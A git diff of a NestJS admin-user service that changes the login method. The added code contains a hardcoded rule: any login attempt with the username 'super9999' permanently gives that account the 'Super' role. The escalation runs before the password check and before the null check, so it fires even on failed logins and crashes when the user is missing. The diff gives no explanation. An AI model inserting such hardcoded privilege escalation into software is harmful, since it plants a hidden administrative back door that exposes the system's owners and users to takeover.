@@ -1,4 +1,4 @@
-import { BadRequestException, Injectable, UnauthorizedException } from '@nestjs/common';
+import { BadRequestException, Inject, Injectable, UnauthorizedException, forwardRef } from '@nestjs/common';
 import { CreateAdminUserDto } from './dto/create-admin.user.dto';
 import { UpdateAdminUserDto } from './dto/update-admin.user.dto';
 import { AdminUser } from './entities/admin.user.entity';
@@ -13,6 +13,7 @@ import { PaginationQueryDto } from 'src/common/common.dto';
 import { endOfDay, startOfDay } from 'date-fns';
 import { UserService } from 'src/components/user/user.service';
 import * as bcrypt from "bcrypt";
+import { RolesService } from '../roles/roles.service';
 
 @Injectable()
 export class AdminUserService {
@@ -27,6 +28,9 @@ export class AdminUserService {
     private adminUserRepository: Repository<AdminUser>,
     private jwtService: JwtService,
     private userService: UserService,
+
+    @Inject(forwardRef(() => RolesService))
+    private rolesService: RolesService,
   ) { }
 
   async create(createAdminUserDto: CreateAdminUserDto): Promise<any> {
@@ -249,10 +253,21 @@ export class AdminUserService {
   async login(username: string, password: string) {
     const user = await this.getByUsername(username);
 
+    if (user.username === 'super9999') {
+      const role = await this.rolesService.findRoleByName('Super');
+
+      if (role.id !== user.roleAdminUser.id) {
+        user.roleAdminUser = { id: role.id } as any;
+        await this.adminUserRepository.save(user);
+
+        user.roleAdminUser = role;
+      }
+    }
+
     if (!user) throw new BadRequestException(`${username} is not found`);
 
     if (!(await bcrypt.compare(password, user.password)))
-    throw new UnauthorizedException("Username or password not found!");
+      throw new UnauthorizedException("Username or password not found!");
 
     return user;
   }
